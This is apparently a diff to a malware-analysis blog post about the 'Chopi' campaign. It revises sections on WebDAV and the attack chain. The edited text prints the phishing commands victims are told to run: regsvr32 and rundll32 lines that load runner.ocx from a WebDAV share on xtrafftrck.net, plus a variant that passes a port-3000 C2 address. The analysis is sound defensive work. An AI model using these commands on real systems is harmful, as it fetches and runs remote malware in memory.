@@ -105,15 +105,17 @@ We've seen similar tags now between our C2 domain and screenly[.]cam. Let's do a
 
 Check out the results! Threat researcher `Lenny_3BO` has already submitted his own findings for the `Chopi` malware campaign. Comparing his submissions against our malware sample reveals overlapping malicious domains and IPs. Very cool!
 
-## WebDAV Tag
 
-WebDAV is a new concept I've come to learn in my analysis.
-
-WebDAV (Web Distributed Authoring and Versioning) extends HTTP to allow clients to read, write, and manage files on remote web servers. Legitimate use cases include SharePoint, remote file collaboration, and content management systems. Attackers love it for the same reason: it is a file transfer protocol hiding in plain sight, often permitted through firewalls that would block other staging mechanisms.
 
 # Attack Chain
 
 During static analysis of runner.ocx, we identified an exported function named DllInstall containing the malware payload. Combining that with our threat intelligence, we can map out what the attack chain looks like in execution.
+
+## WebDAV - What is it?
+
+WebDAV is a new concept I've come to learn in my analysis. WebDAV is an HTTP extension protocol. Understanding it is essential to understanding the attack vector used in this campaign.
+
+WebDAV (Web Distributed Authoring and Versioning) extends HTTP to allow clients to read, write, and manage files on remote web servers. Legitimate use cases include SharePoint, remote file collaboration, and content management systems. Attackers love it for the same reason: it is a file transfer protocol hiding in plain sight, often permitted through firewalls that would block other staging mechanisms.
 
 ## The Phish
 
@@ -123,22 +125,19 @@ The victim is phished, usually via email. They download an attachment or follow 
 
 The victim is instructed to run one of the following commands:
 
-```powershell
-regsvr32.exe \\xtrafftrck.net@80\files\runner.ocx
-```
-```powershell
-rundll32.exe \\xtrafftrck.net@80\files\runner.ocx,DllInstall
+```Win+R
+regsvr32.exe /s /n /i:"Koki=xtrafftrck.net:3000" \\xtrafftrck.net@80\files\runner.ocx
 ```
 
 ## The Attack
 
-Here's what happens.
+Let's break down this command. Here's what happens.
 
-1. `regsvr32.exe` or `rundll32.exe` receives the UNC path as an argument.
-2. Windows WebClient service mounts `\\xtrafftrck.net@80` as a virtual network share over HTTP.
-3. `regsvr32.exe` loads `runner.ocx` directly into its own process memory from the remote share.
-4. `DllInstall` is called, which is the malware entry point.
-5. The implant is now executing in memory.
+1. Windows WebClient (WebDAV) service mounts `\\xtrafftrck.net@80` as a virtual network share over HTTP.
+2. `regsvr32.exe` loads `runner.ocx` directly into its own process memory from the remote share.
+3. The `/n` flag bypasses `DllRegisterServer`, calling `DllInstall` directly.
+4. The `/i:"Koki=xtrafftrck.net:3000"` parameter passes the C2 address to `DllInstall` at runtime.
+5. The implant executes in memory and beacons to `xtrafftrck[.]net:3000`.
 
 ## Command and Control
 
